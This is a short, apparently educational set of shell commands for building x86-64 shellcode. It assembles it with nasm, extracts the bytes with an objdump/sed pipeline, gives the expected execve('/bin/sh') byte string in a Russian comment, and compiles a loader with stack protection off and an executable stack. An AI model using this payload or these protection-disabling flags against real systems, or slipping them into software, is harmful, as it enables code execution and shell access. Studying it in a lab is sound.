nasm -f elf64 shellcode.asm -o shellcode.o
ld shellcode.o -o shellcode_test
./shellcode_test

objdump -d shellcode.o


objdump -d shellcode.o | grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'


# Ожидаемый результат (примерно такой):
# "\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x48\x31\xc0\xb0\x3b\x0f\x05"

gcc -fno-stack-protector -z execstack loader.c -o loader